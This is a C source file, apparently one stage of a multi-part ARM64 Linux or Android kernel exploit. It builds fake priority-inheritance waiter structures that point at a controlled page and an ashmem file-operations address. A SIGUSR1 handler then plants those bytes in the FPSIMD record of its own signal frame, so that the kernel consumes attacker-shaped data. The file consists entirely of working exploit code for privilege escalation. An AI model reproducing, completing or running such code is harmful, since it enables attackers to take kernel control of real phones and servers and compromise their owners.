/*
 * Constructs the PI-waiter data carried in an ARM signal frame. A SIGUSR1
 * handler locates the FPSIMD record and copies the prepared bytes into it.
 */

#define _GNU_SOURCE
#include <errno.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/ucontext.h>
#include <unistd.h>

#include "06_signal_frame_payload.h"

#define SIGUSR1_PAYLOAD_SIZE 0x200

static unsigned char g_payload[SIGUSR1_PAYLOAD_SIZE];
static atomic_int g_handler_result; /* 0=not run yet, 1=success, -1=failed */

static void put64(unsigned char *base, size_t off, uint64_t value) {
  memcpy(base + off, &value, sizeof(value));
}

void sigusr1_build_payload(uint64_t page_base, uint64_t ashmem_misc_fops_addr) {
  memset(g_payload, 0, sizeof(g_payload));
  uint64_t pi_parent = page_base | 0x1180ULL;
  uint64_t pi_waiters_self_ref = page_base | 0x14e8ULL;
  uint64_t scratch_2380 = page_base | 0x2380ULL;
  uint64_t waiter_lock = page_base | 0x1390ULL;

  put64(g_payload, 0x18, pi_parent);
  put64(g_payload, 0x20, ashmem_misc_fops_addr);
  put64(g_payload, 0x28, 0);
  put64(g_payload, 0x30, pi_waiters_self_ref);
  put64(g_payload, 0x38, 0);
  put64(g_payload, 0x40, 0);
  put64(g_payload, 0x48, scratch_2380);
  put64(g_payload, 0x50, waiter_lock);
  put64(g_payload, 0x58, 0x8200000000ULL);
  put64(g_payload, 0x60, 0);
  put64(g_payload, 0x68, 0);
}

static void sigusr1_handler(int sig, siginfo_t *info, void *ucontext_v) {
  (void)sig;
  (void)info;
  ucontext_t *uc = (ucontext_t *)ucontext_v;
  unsigned char *base = uc->uc_mcontext.__reserved;
  size_t limit = sizeof(uc->uc_mcontext.__reserved);
  size_t offset = 0;
  struct fpsimd_context *fpsimd = NULL;

  while (offset + sizeof(struct _aarch64_ctx) <= limit) {
    struct _aarch64_ctx *head = (struct _aarch64_ctx *)(base + offset);
    uint32_t magic = head->magic;
    uint32_t size = head->size;

    if (magic == 0 && size == 0) {
      break; /* end of the record list, real kernel uses the same sentinel */
    }
    if (size < sizeof(struct _aarch64_ctx) || (size & 0xf) != 0) {
      atomic_store(&g_handler_result, -1);
      return;
    }
    if (offset + size > limit) {
      atomic_store(&g_handler_result, -1);
      return;
    }
    if (magic == FPSIMD_MAGIC && size == sizeof(struct fpsimd_context)) {
      fpsimd = (struct fpsimd_context *)head;
    }
    offset += size;
  }
  if (fpsimd == NULL) {
    atomic_store(&g_handler_result, -1);
    return;
  }

  volatile unsigned char *dst = (volatile unsigned char *)fpsimd->vregs;
  volatile const unsigned char *src =
      (volatile const unsigned char *)g_payload;
  for (size_t i = 0; i < sizeof(g_payload); i++) {
    dst[i] = src[i];
  }
  atomic_store(&g_handler_result, 1);
}

int sigusr1_install_handler(void) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = sigusr1_handler;
  sa.sa_flags = SA_SIGINFO | SA_RESTART;
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR1, &sa, NULL) != 0) {
    fprintf(stderr, "[sigusr1] sigaction failed errno=%d\n", errno);
    return 0;
  }
  return 1;
}

int sigusr1_fire_and_wait(void) {
  atomic_store(&g_handler_result, 0);

  pid_t pid = getpid();
  long tid = syscall(SYS_gettid);
  long ret = syscall(SYS_tgkill, pid, tid, SIGUSR1);
  if (ret != 0) {
    fprintf(stderr, "[sigusr1] tgkill failed errno=%d\n", errno);
    return 0;
  }

  return atomic_load(&g_handler_result) == 1;
}
